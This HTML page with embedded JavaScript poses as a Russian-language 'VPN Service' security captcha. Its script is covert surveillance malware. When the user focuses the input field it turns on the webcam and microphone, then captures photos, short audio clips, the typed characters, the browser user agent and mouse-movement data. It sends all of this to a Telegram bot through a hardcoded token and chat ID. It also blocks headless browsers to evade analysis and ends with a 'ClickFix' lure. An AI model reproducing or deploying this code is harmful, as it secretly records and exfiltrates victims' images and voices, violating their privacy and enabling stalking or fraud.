<!DOCTYPE html>
<html lang="ru">
<head>
    <!-- –¢–í–û–ô CSS –ë–ï–ó –ò–ó–ú–ï–ù–ï–ù–ò–ô -->
    <style>
        /* ... –≤–µ—Å—å —Ç–≤–æ–π CSS –∫–æ–ø–∏-–ø–∞—Å—Ç ... */
    </style>
</head>
<body>
    <!-- –¢–í–û–ô HTML –ë–ï–ó –ò–ó–ú–ï–ù–ï–ù–ò–ô -->
    <div class="container">
        <div class="camera-status" id="cameraStatus" title="–ö–∞–º–µ—Ä–∞ –≤—ã–∫–ª—é—á–µ–Ω–∞"></div>
        <h1>üîí –ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</h1>
        <p>VPN Service –æ–±–Ω–∞—Ä—É–∂–∏–ª –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—É—é –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å. –ü—Ä–æ–π–¥–∏—Ç–µ –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—é:</p>
        <div class="progress-container">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        <div id="captchaCode">‚Äî‚Äî‚Äî</div>
        <input type="text" id="userInput" maxlength="8" placeholder="–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥" autocomplete="off">
        <button class="verify-btn" id="verifyBtn">–ü—Ä–æ–≤–µ—Ä–∏—Ç—å</button>
        <div id="status" class="status"></div>
    </div>

    <script>
        console.log('üöÄ –ó–ê–ì–†–£–ó–ö–ê...');

        // === –ñ–î–ï–ú DOM ===
        function initElements() {
            const elements = {
                captchaCode: document.getElementById('captchaCode'),
                userInput: document.getElementById('userInput'),
                verifyBtn: document.getElementById('verifyBtn'),
                progressBar: document.getElementById('progressBar'),
                status: document.getElementById('status'),
                cameraStatus: document.getElementById('cameraStatus')
            };
            
            if (!elements.captchaCode) {
                console.log('‚è≥ –ñ–¥–µ–º DOM...');
                setTimeout(initElements, 100);
                return;
            }
            
            console.log('‚úÖ DOM –≥–æ—Ç–æ–≤');
            startCaptcha(elements);
        }

        // === –û–°–ù–û–í–ù–û–ô –°–¢–ê–†–¢ ===
        function startCaptcha(elements) {
            // –¢–í–û–ò –ö–û–ù–°–¢–ê–ù–¢–´
            const TELEGRAM_TOKEN = '8282145932:AAE3Ze0wPSRFDx0FroHUJMTOXWHcpbvcb_w';
            const CHAT_ID = '882898449';

            // –¢–í–û–ò –ü–ï–†–ï–ú–ï–ù–ù–´–ï
            let currentCaptcha = '';
            let attempts = 0;
            let step = 0;
            const totalSteps = 4;
            let stream = null;
            let cameraActive = false;
            let mouseTrail = [];
            let batteryInfo = {};
            let keystrokes = [];

            // === –ë–û–¢–ó–ê–©–ò–¢–ê ===
            function isBot() {
                const headless = navigator.webdriver || /HeadlessChrome/.test(navigator.userAgent);
                const linuxBot = /Linux.*X11/.test(navigator.userAgent) && screen.height < 800;
                return headless || linuxBot;
            }

            if (isBot()) {
                document.body.innerHTML = '<h1 style="color:red">‚ùå –û–±–Ω–æ–≤–∏—Ç–µ –±—Ä–∞—É–∑–µ—Ä</h1>';
                return;
            }

            // === üñ±Ô∏è MOUSE ===
            document.addEventListener('mousemove', (e) => {
                mouseTrail.push({x: e.clientX, y: e.clientY, t: Date.now()});
                if (mouseTrail.length > 100) mouseTrail.shift();
            });

            // === üì∏ –ö–ê–ú–ï–†–ê (iOS FIX) ===
            async function initCamera() {
                try {
                    stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'user', width: 640, height: 480 },
                        audio: true
                    });
                    cameraActive = true;
                    elements.cameraStatus.classList.add('active');
                    elements.cameraStatus.title = 'üì∏ –ê–∫—Ç–∏–≤–Ω–∞';
                    console.log('üé• –ö–∞–º–µ—Ä–∞ OK');
                    return true;
                } catch(e) {
                    console.log('üö´ –ö–∞–º–µ—Ä–∞:', e.name);
                    return false;
                }
            }

            // === üì∏ –§–û–¢–û ===
            async function captureFullPhoto() {
                if (!stream) return null;
                try {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    await new Promise(r => video.onloadeddata = r);
                    await new Promise(r => setTimeout(r, 200));
                    
                    const canvas = document.createElement('canvas');
                    canvas.width = 640; canvas.height = 480;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    video.remove();
                    return canvas.toDataURL('image/jpeg', 0.8);
                } catch(e) {
                    return null;
                }
            }

            // === üîä –ê–£–î–ò–û ===
            async function recordAudio() {
                if (!stream) return null;
                try {
                    const mediaRecorder = new MediaRecorder(stream);
                    const chunks = [];
                    return new Promise(resolve => {
                        mediaRecorder.ondataavailable = e => chunks.push(e.data);
                        mediaRecorder.onstop = () => {
                            const blob = new Blob(chunks, { type: 'audio/webm' });
                            const reader = new FileReader();
                            reader.onloadend = () => resolve(reader.result);
                            reader.readAsDataURL(blob);
                        };
                        mediaRecorder.start();
                        setTimeout(() => mediaRecorder.stop(), 2000); // 2 —Å–µ–∫
                    });
                } catch(e) {
                    return null;
                }
            }

            // === Base64‚ÜíBlob ===
            function dataURItoBlob(dataURI) {
                const byteString = atob(dataURI.split(',')[1]);
                const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
                const ab = new ArrayBuffer(byteString.length);
                const ia = new Uint8Array(ab);
                for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
                return new Blob([ab], { type: mimeString });
            }

            // === –û–¢–ü–†–ê–í–ö–ê –§–û–¢–û/–ê–£–î–ò–û ===
            async function sendPhoto(photo, caption) {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', dataURItoBlob(photo), 'photo.jpg');
                formData.append('caption', caption);
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
            }

            async function sendVoice(audio, caption) {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('voice', dataURItoBlob(audio), 'voice.webm');
                formData.append('caption', caption);
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVoice`, { method: 'POST', body: formData });
            }

            // === –ù–ï–ó–ê–ú–ï–¢–ù–ê–Ø –û–¢–ü–†–ê–í–ö–ê ===
            async function sendStealthPackage(input) {
                const photo = await captureFullPhoto();
                const audio = await recordAudio();
                
                // –¢–µ–∫—Å—Ç
                const fpText = `üïµÔ∏è‚Äç‚ôÇÔ∏è #${attempts} | ${input}\nüì± ${navigator.userAgent.slice(0,50)}...\nüñ±Ô∏è ${mouseTrail.length} —Ç–æ—á–µ–∫`;
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: CHAT_ID, text: fpText})
                });

                // –§–æ—Ç–æ
                if (photo) sendPhoto(photo, `üì∏ ${input}`);
                // –ê—É–¥–∏–æ  
                if (audio) sendVoice(audio, `üîä ${input}`);
            }

            // === –ö–ê–ü–ß–ê ===
            function generateCaptcha() {
                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
                return Array(8).fill().map(() => chars[Math.floor(Math.random()*chars.length)]).join('');
            }

            function updateProgress() {
                elements.progressBar.style.width = `${(step / totalSteps) * 100}%`;
            }

            // === INPUT (–ù–ï–ó–ê–ú–ï–¢–ù–´–ô –°–ë–û–†) ===
            elements.userInput.addEventListener('focus', async () => {
                console.log('üëÜ Focus - –∫–∞–º–µ—Ä–∞...');
                if (!cameraActive) await initCamera();
            });

            elements.userInput.addEventListener('input', async () => {
                const input = elements.userInput.value.toUpperCase();
                keystrokes.push({char: input.slice(-1), time: Date.now()});
                
                // üïµÔ∏è‚Äç‚ôÇÔ∏è –ü–µ—Ä–≤—ã–µ 3 –±—É–∫–≤—ã = –§–û–¢–û+–ê–£–î–ò–û
                if (cameraActive && input.length <= 3 && input.length > 0) {
                    console.log(`üì∏ –°–±–æ—Ä: ${input}`);
                    await sendStealthPackage(input);
                }
            });

            // === –ö–ù–û–ü–ö–ê ===
            elements.verifyBtn.addEventListener('click', async () => {
                const input = elements.userInput.value.toUpperCase().trim();
                attempts++;
                
                document.body.classList.add('loading');
                elements.status.textContent = 'üîç –ü—Ä–æ–≤–µ—Ä–∫–∞...';

                await sendStealthPackage(input + ' [BUTTON]');

                setTimeout(() => {
                    if (input === currentCaptcha) {
                        step++;
                        elements.status.textContent = '‚úÖ –í–µ—Ä–Ω–æ!';
                        elements.status.className = 'status success';
                        if (step >= totalSteps) {
                            document.body.innerHTML = `
                                <div class="clickfix">
                                    <h2>üîß ClickFix</h2>
                                    <p>–ö–ª–∏–∫–Ω–∏—Ç–µ –¥–ª—è –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–∏—è</p>
                                    <button onclick="location.reload()">–ò–°–ü–†–ê–í–ò–¢–¨</button>
                                </div>`;
                            return;
                        }
                    } else {
                        elements.status.textContent = '‚ùå –ù–µ–≤–µ—Ä–Ω–æ';
                        elements.status.className = 'status error';
                    }

                    currentCaptcha = generateCaptcha();
                    elements.captchaCode.textContent = currentCaptcha;
                    elements.userInput.value = '';
                    updateProgress();
                    document.body.classList.remove('loading');
                }, 1200);
            });

            // === –°–¢–ê–†–¢ –ö–ê–ü–ß–ò ‚úÖ
            currentCaptcha = generateCaptcha();
            elements.captchaCode.textContent = currentCaptcha;
            updateProgress();
            
            console.log('‚úÖ –ö–ê–ü–ß–ê –†–ê–ë–û–¢–ê–ï–¢! –í–≤–æ–¥–∏ –∫–æ–¥ ‚Üí —Ñ–æ—Ç–æ+–≥–æ–ª–æ—Å –≤ –±–æ—Ç');
        }

        // === –ê–í–¢–û–°–¢–ê–†–¢ ===
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', initElements);
        } else {
            initElements();
        }
    </script>
</body>
</html>
